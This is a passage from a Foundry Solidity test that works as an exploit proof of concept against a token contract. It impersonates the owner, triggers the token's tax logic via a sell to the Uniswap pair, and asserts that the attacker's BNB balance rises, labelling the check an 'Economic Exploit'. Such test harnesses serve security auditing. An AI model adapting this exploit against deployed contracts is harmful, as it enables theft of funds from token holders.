        vm.startPrank(owner);
        if (CoinToken(TARGET).isExcluded(attacker)) {
            CoinToken(TARGET).removeExclude(attacker);
        }
        vm.stopPrank();

        // Record attacker BNB balance before
        uint256 beforeBalance = attacker.balance;

        // Step 5: Sell tokens by transferring to pair (simulate a sell)
        // The pair address is from the contract
        address pairAddress = CoinToken(TARGET).uniswapV2Pair();
        vm.prank(attacker);
        CoinToken(TARGET).transfer(pairAddress, 1000 * 10**18); // This will trigger tax because to == pair

        // Step 6: Possibly trigger tax manually if threshold not met
        // Check if tax sum reached threshold; we can call triggerTax as owner
        vm.prank(owner);
        CoinToken(TARGET).triggerTax(); // This calls handleTax with from=address(0), to=pair, amount=0

        // Step 7: Check attacker balance increased
        uint256 afterBalance = attacker.balance;
        assertGt(afterBalance, beforeBalance, "Attacker BNB balance should increase");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

